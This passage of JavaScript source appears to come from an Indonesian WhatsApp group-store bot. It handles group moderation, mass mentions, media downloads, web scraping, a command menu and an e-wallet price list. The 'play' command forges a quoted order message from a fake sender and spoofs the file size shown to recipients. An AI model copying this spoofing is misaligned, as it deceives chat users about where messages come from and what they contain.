return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
reply(`Close time ${q} dimulai dari sekarang`)
setTimeout(() => {
var nomor = m.participant
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
GpStore.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break
case 'opentime':
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
reply(`Open time ${q} dimulai dari sekarang`)
setTimeout(() => {
var nomor = m.participant
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
GpStore.groupSettingUpdate(from, 'not_announcement')
reply(open)
}, timer)
break
case 'kick': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await GpStore.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'promote': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await GpStore.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await GpStore.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Teks?`)
GpStore.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'tagall': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Teks?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n══✪�? *👥 Tag All* 〙✪══\n`
for (let mem of participants) {
teks += `�? @${mem.id.split('@')[0]}\n`
}
GpStore.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return reply(`Kirim/reply text dengan caption ${prefix + command}`)
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(q)
reply(eb)
}
break
case 'dbinary': {
if (!q) return reply(`Kirim/reply text dengan caption ${prefix + command}`)
let { dBinary } = require('./scrape/binary')
let db = await dBinary(q)
reply(db)
}
break
case 'tiktokvideo':{
if (!q) return reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
let res = await tiktokdl(q)
GpStore.sendMessage(m.chat,{video:{url: res.media[1].url},caption: `${mess.succes}`},{quoted:m})
}
break
case 'tiktokaudio':{
if (!q) return reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
let tytyd = await tiktokdl(q)
GpStore.sendMessage(m.chat,{audio:{url: tytyd.media[2].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
}
break
case 'googles': {
if (!q) return reply(`Example : ${prefix + command} KirBotz WhatsApp`)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `�? *Title* : ${g.title}\n`
teks += `�? *Description* : ${g.snippet}\n`
teks += `�? *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break
case 'happymod':{
if (!q) return reply(`Contoh ${prefix+command} Nama Apk Game`)
let kat = await scp1.happymod(q)
reply(util.format(kat))
}
break
case 'cariresep':{
if (!q) return reply(`Contoh ${prefix+command} ayam geprek`)
let ker = await scp1.cariresep(q)
reply(util.format(ker))
}
break
case 'bacaresep':{
if (!q) return reply(`Contoh ${prefix+command} https://resepkoki.id/resep/resep-ayam-geprek-keju/`)
let kay = await scp1.bacaresep(q)
let dty = `Resep Di Bawah
Judul : ${kay.judul_nya}
Waktu : ${kay.waktu_nya}
Hasil : ${kay.hasil_nya}
Tingkat Kesulitan : ${kay.tingkat_kesulitan}
Bahan :
${kay.bahan_nya}`
GpStore.sendMessage(m.chat,{
image:{
url:kay.thumb_nya},
caption:dty,
jpegThumbnail: ppnyaimg},
{quoted:m})
}
break
case 'search':
case 'ytsearch':
if (args.length < 1) return reply(`Contoh:\n${prefix+command} bukti Virgoun`)
let list_rows = [];
const data = await yts(q);
for(let a of data.all) {
list_rows.push({
title: a.title, description: `Channel: ${a.author.name} | Durasi: ${a.duration}`, rowId: `.play ${a.url}`
})
}
const buttonNya = {
text: `Hasil Pencarian Dari ${q}`,
footer: `Silahkan Tap Tombol Dibawah`,
buttonText: 'Tap Disini',
sections: [{
title: "Hasil Pencarian", 
rows: list_rows
}],
listType: 1
}
const sendMsg = await GpStore.sendMessage(from, buttonNya)
break
case 'play':{
if (!text) return reply(`Example : ${prefix+command} story wa anime`)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = '62858428854987@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}`
let buttonse = [
{buttonId: `${prefix}mp4 ${anu.url}`, buttonText: {displayText: `Video`}, type: 1},
{buttonId: `${prefix}mp3 ${anu.url}`, buttonText: {displayText: `Audio`}, type: 1}
]
let buttonMessages = {
image: eek, 
jpegThumbnail: eek,
caption: ngen,
fileLength: "99999999999",
mentions:[sender, owned],
footer: `_Powered By @${owned.split("@")[0]}_`,
buttons: buttonse,
headerType: 4,
contextInfo: {
"mentionedJid": [sender, owned],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hai Kak ${pushname}`, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": eek,
"mediaUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX',
"sourceUrl": 'https://chat.whatsapp.com/Kpn1iypLsNFCeK7SgPYYIX'
}}
}
GpStore.sendMessage(m.chat, buttonMessages, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6281903153426-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'Created By GpStore',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
}
break
case 'ytmp4': case 'mp4':{
if (!text) return reply('Masukan Link Nya!!!')
downloadMp4(text)
}
break
case 'ytmp3': case 'mp3':{
if (!text) return reply('Masukan Link Nya!!!')
downloadMp3(text)
}
break
case 'allmenu':{
GpStore.sendMessage(from,{image:thumb, caption:`Hai Kak @${sender.split("@")[0]}

𝗕𝘆 𝗚𝘂𝘀𝘁𝗶 𝗣𝗮𝗻𝗲𝗻𝗴𝗮𝗵

┏━ꕥ〔 llı 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ıll 〕ꕥ━⬣
┃✾ .𝚋𝚌 
┃✾ .𝚓𝚘𝚒𝚗 
┃✾ .𝚜𝚑𝚞𝚝𝚍𝚘𝚠𝚗 
┃✾ .𝚊𝚞𝚝𝚘𝚍𝚕𝚝𝚝
┃✾ .𝚊𝚞𝚝𝚘𝚜𝚝𝚒𝚌𝚔𝚎𝚛
┃✾ .𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝
┃✾ .𝚊𝚍𝚍𝚙𝚛𝚎𝚖
┃✾ .𝚍𝚎𝚕𝚙𝚛𝚎𝚖
┃✾ .𝚊𝚍𝚍𝚘𝚠𝚗𝚎𝚛
┃✾ .𝚍𝚎𝚕𝚘𝚠𝚗𝚎𝚛
┃✾ .𝚊𝚍𝚍𝚕𝚒𝚜𝚝
┃✾ .𝚍𝚎𝚕𝚕𝚒𝚜𝚝
┃✾ .𝚞𝚙𝚍𝚊𝚝𝚎𝚕𝚒𝚜𝚝
┃✾ .𝚕𝚒𝚜𝚝𝚗𝚢𝚊
┃✾ .𝚊𝚍𝚍𝚟𝚗
┃✾ .𝚍𝚎𝚕𝚟𝚗
┃✾ .𝚕𝚒𝚜𝚝𝚟𝚗
┃✾ .𝚋𝚊𝚗 𝚊𝚍𝚍
┃✾ .𝚋𝚊𝚗 𝚍𝚎𝚕
┗━ꕥ

┏━ꕥ〔 llı 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨 ıll 〕ꕥ━⬣
┃✾ .𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 (𝚘𝚗/𝚘𝚏𝚏)
┃✾ .𝚠𝚎𝚕𝚌𝚘𝚖𝚎 (𝚘𝚗/𝚘𝚏𝚏
┃✾ .𝚊𝚍𝚍 𝟼𝟸𝚇𝚇𝚇-𝚇𝚇𝚇𝚇-𝚇𝚇𝚇𝚇
┃✾ .𝚔𝚒𝚌𝚔 @𝚝𝚊𝚐𝚜
┃✾ .𝚙𝚛𝚘𝚖𝚘𝚝𝚎
┃✾ .𝚝𝚊𝚐𝚊𝚕𝚕
┃✾ .𝚊𝚗𝚝𝚒𝚠𝚊𝚖𝚎
┃✾ .𝚌𝚕𝚘𝚜𝚎𝚝𝚒𝚖𝚎
┃✾ .𝚘𝚙𝚎𝚗𝚝𝚒𝚖𝚎
┗━ꕥ

┏━ꕥ〔 llı 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨  ıll 〕
┃✾ .𝚝𝚒𝚔𝚝𝚘𝚔𝚟𝚒𝚍𝚎𝚘
┃✾ .𝚝𝚒𝚔𝚝𝚘𝚔𝚊𝚞𝚍𝚒𝚘
┃✾ .𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑
┃✾ .𝚙𝚕𝚊𝚢
┃✾ .𝚢𝚝𝚖𝚙𝟹
┃✾ .𝚐𝚘𝚘𝚐𝚕𝚎𝚜
┃✾ .𝚑𝚊𝚙𝚙𝚢𝚖𝚘𝚍
┗━ꕥ

┏━ꕥ〔 llı 𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨 ıll 〕ꕥ━⬣
┃✾ .𝚘𝚠𝚗𝚎𝚛
┃✾ .𝚓𝚊𝚍𝚒𝚋𝚘𝚝
┃✾ .𝚜𝚝𝚒𝚌𝚔𝚎𝚛
┃✾ .𝚝𝚘𝚟𝚗
┃✾ .𝚝𝚘𝚞𝚛𝚕
┃✾ .𝚝𝚘𝚖𝚙𝟹
┃✾ .𝚝𝚘𝚒𝚖𝚐
┃✾ .𝚝𝚘𝚘𝚗𝚌𝚎
┃✾ .𝚜𝚖𝚎𝚖𝚎
┃✾ .𝚜𝚗𝚘𝚋𝚐
┃✾ .𝚖𝚎𝚗𝚏𝚎𝚜
┃✾ .𝚕𝚎𝚊𝚟𝚎
┃✾ .𝚎𝚋𝚒𝚗𝚎𝚛𝚢
┃✾ .𝚍𝚋𝚒𝚗𝚊𝚛𝚢
┃✾ .𝚜𝚜𝚠𝚎𝚋
┃✾ .𝚠𝚊𝚜𝚝𝚎𝚍
┃✾ .𝚌𝚊𝚛𝚒𝚍𝚘𝚒
┃✾ .𝚌𝚊𝚛𝚒𝚝𝚎𝚖𝚊𝚗
┃✾ .𝚓𝚊𝚒𝚕
┃✾ .𝚐𝚊𝚢
┃✾ .𝚙𝚒𝚡𝚎𝚕𝚊𝚝𝚎
┃✾ .𝚐𝚒𝚝𝚝𝚎𝚜
┗━ꕥ.`, mentions: [sender]},{quoted:m})
}
break
case 'saldoewallet':{
GpStore.sendMessage(from,{image:saldo, caption:`Hai Kak @${sender.split("@")[0]}

𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗗𝗜 𝗣𝗜𝗟𝗜𝗛
Minat? wa.me/6281390368580
♚︎ 𝙱𝚈 𝙶𝚄𝚂𝚃𝙸 𝙿𝙰𝙽𝙴𝙽𝙶𝙰𝙷

┏━ꕥ〔 llı 𝗘-𝗪𝗔𝗟𝗟𝗘𝗧 llı 〕ꕥ━⬣
┃💳𝟷𝟶𝚔 = 𝗥𝗽.𝟭𝟯.𝟬𝟬𝟬
┃💳𝟷𝟻𝙺 = 𝗥𝗽.𝟭𝟴.𝟬𝟬𝟬
┃💳𝟸𝟶𝙺 = 𝗥𝗽.𝟮𝟯.𝟬𝟬𝟬
┃💳𝟹𝟶𝙺 = 𝗥𝗽.𝟯𝟯.𝟬𝟬𝟬
┃💳𝟺𝟶𝙺 = 𝗥𝗽.𝟰𝟯.𝟬𝟬𝟬
┃💳𝟻𝟶𝙺 = 𝗥𝗽.𝟱𝟯.𝟬𝟬𝟬
┃💳𝟼𝟶𝙺 = 𝗥𝗽.𝟲𝟯.𝟬𝟬𝟬
